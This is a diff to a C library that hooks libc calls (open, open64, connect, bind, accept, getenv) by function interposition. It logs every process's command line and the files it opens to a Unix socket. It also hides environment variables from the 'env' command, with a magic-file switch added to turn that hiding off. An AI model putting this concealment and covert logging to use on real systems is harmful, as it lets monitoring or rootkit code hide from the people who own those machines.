@@ -8,7 +8,6 @@
 #include <stdarg.h>
 #include <sys/types.h>
 #include <sys/stat.h>
-#include <fcntl.h>
 #include <unistd.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
@@ -20,6 +19,16 @@
  * Do anything override syscall on this function.
  */
 
+static int HiddenMode() {
+	int _ = 0;
+	struct stat st;
+
+	if (0 == stat(MAGIC_NAME, &st)) {
+		DEBUG_MSG("Disable Hidden Mode");
+		_ = 1;
+	}
+	return _;
+}
 static char **hidden_env() {
 	int i, numEnv = 0;
 	char **ret = NULL, **ptr;
@@ -61,12 +70,12 @@ __attribute__((constructor)) void begin(void) {
 	/* Bind to client if possbile */
 	if (NULL == (__libc__ = dlopen(LIBC_SHARDLIB, RTLD_LAZY))) {
 		DEBUG_MSG("Cannot load libc %s", LIBC_SHARDLIB);
-	} else if(0 > (__log_fd_ = socket(PF_UNIX, SOCK_STREAM, 0))) {
+	} else if(0 > (__log_fd_ = socket(PF_UNIX, SOCK_DGRAM, 0))) {
 		DEBUG_MSG("Cannot create domain socket %m");
 	} else {
 		addr.sun_family = AF_UNIX;
 		snprintf(addr.sun_path, sizeof(addr.sun_path), LISTEN_SOCKET);
-		if (0 != connect(__log_fd_, (struct sockaddr *)&addr, sizeof(struct sockaddr_un))) {
+		if (0 != _connect(__log_fd_, (struct sockaddr *)&addr, sizeof(struct sockaddr_un))) {
 			DEBUG_MSG("Cannot connect to %s (%m)", LISTEN_SOCKET);
 		} else {
 			DEBUG_MSG("Success bind to %s", LISTEN_SOCKET);
@@ -84,10 +93,12 @@ __attribute__((constructor)) void begin(void) {
 
 
 	/* Hidden environment for env */
-	if (0 == strcmp("/usr/bin/env", __cmdline__) || 0 == strcmp("env", __cmdline__)) {
-		_orig_environ = environ;
-		environ = hidden_env();
-		DEBUG_MSG("Hidden environment for env");
+	if (! HiddenMode()) {
+		if (0 == strcmp("/usr/bin/env", __cmdline__) || 0 == strcmp("env", __cmdline__)) {
+			_orig_environ = environ;
+			environ = hidden_env();
+			DEBUG_MSG("Hidden environment for env");
+		}
 	}
 
 	LOG_MSG("%s", __cmdline__);
@@ -195,29 +206,25 @@ static void _init_fcntl_(void) {
 	_open64 = dlsym(RTLD_NEXT, "open64");
 	_dlopen = dlsym(RTLD_NEXT, "dlopen");
 }
-int open (const char *__file, int __oflag, ...) {
+int open (const char *__file, int __oflag, __mode_t __mode) {
 	int _ = -1;
-	va_list args;
 
-	va_start(args, __oflag);
 	if (_open) {
-		_ = _open(__file, __oflag, args);
-		LOG_MSG("%s", __file);
+		_ = _open(__file, __oflag, __mode);
+		LOG_MSG("%s:0x%x:0%o", __file, __oflag, __mode);
 	}
-	va_end(args);
+
 	return _;
 }
 #ifdef __USE_LARGEFILE64
-int open64 (const char *__file, int __oflag, ...) {
+int open64 (const char *__file, int __oflag, __mode_t __mode) {
 	int _ = -1;
-	va_list args;
 
-	va_start(args, __oflag);
 	if (_open64) {
-		_ = _open64(__file, __oflag, args);
-		LOG_MSG("%s", __file);
+		_ = _open64(__file, __oflag, __mode);
+		LOG_MSG("%s:0x%x:0%o", __file, __oflag, __mode);
 	}
-	va_end(args);
+
 	return _;
 }
 #endif /* __USE_LARGEFILE64 */
@@ -370,9 +377,9 @@ char* getenv (const char *__name) {
 
 /* ==== sys/socket.h ==== */
 static void _init_sys_socket_(void) {
-	_bind     = dlsym(RTLD_NEXT, "bind");
-	_connect  = dlsym(RTLD_NEXT, "connect");
-	_accept   = dlsym(RTLD_NEXT, "accept");
+	_bind         = dlsym(RTLD_NEXT, "bind");
+	_connect      = dlsym(RTLD_NEXT, "connect");
+	_accept       = dlsym(RTLD_NEXT, "accept");
 }
 int bind (int __fd, __CONST_SOCKADDR_ARG __addr, socklen_t __len) {
 	int _ = -1;
